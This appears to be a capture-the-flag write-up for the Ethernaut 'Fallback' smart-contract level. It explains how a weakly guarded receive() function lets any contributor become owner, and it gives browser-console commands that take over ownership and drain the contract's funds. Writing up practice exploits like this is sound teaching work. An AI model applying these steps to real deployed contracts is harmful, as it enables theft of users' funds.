# Ethernaut — Fallback (Level) — What the bug was + how to solve it

## What the level is about
This level is designed to teach you how **ownership can be hijacked** when a contract mixes:
- a “normal” payable function (`contribute`) that updates state, and
- a special ETH entrypoint (`receive`) that also mutates critical state (the `owner`).

The contract tracks `contributions[address]` and has an `owner`. The intended “legit” way to become owner would be to contribute more than the current owner — but the initial owner has an insanely high contribution (1000 ETH), so beating it is unrealistic.

## The real vulnerability (the flaw)
The vulnerability is that the contract’s `receive()` function can **set the owner** with a much easier condition:

### `receive()` in Solidity (what it is, and how it works)
`receive()` is a **special function**:
- Signature must be exactly: `receive() external payable`
- It is called automatically when the contract receives ETH **with empty calldata** (no function selector / no data).
- If `receive()` exists, it is preferred over `fallback()` when `msg.data.length == 0`.

In this level, `receive()` does:
- Requires you send some ETH (`msg.value > 0`)
- Requires you already have a non-zero contribution (`contributions[msg.sender] > 0`)
- Then it sets `owner = msg.sender`

So the exploit path is:
1) Make a tiny contribution (< 0.001 ETH) so `contributions[player] > 0`
2) Send a plain ETH transfer (empty data) to trigger `receive()`
3) `receive()` assigns you as owner
4) Call `withdraw()` as the new owner

That’s the bug: **a privileged state change (owner assignment) is reachable via an ETH receive hook** with a weak condition.

---

## Commands to solve the level (Ethernaut browser console)

```
/**
 * 1) Contribute a tiny amount so contributions[player] > 0
 *    Must be < 0.001 ether (per require in contribute()).
 */
await contract.contribute({ value: web3.utils.toWei("0.0005", "ether") }),

/**
 * 2) Trigger receive() by sending ETH with EMPTY calldata (no `data` field).
 *    This calls receive() automatically, which sets owner = msg.sender
 *    because contributions[msg.sender] > 0 now.
 */
await web3.eth.sendTransaction({
  from: player,
  to: contract.address,
  value: "1" // 1 wei is enough, must be > 0
})

/**
 * 3) Verify ownership (should now be `player`)
 */
await contract.owner()

/**
 * 4) Drain the contract as the new owner
 */
await contract.withdraw()
```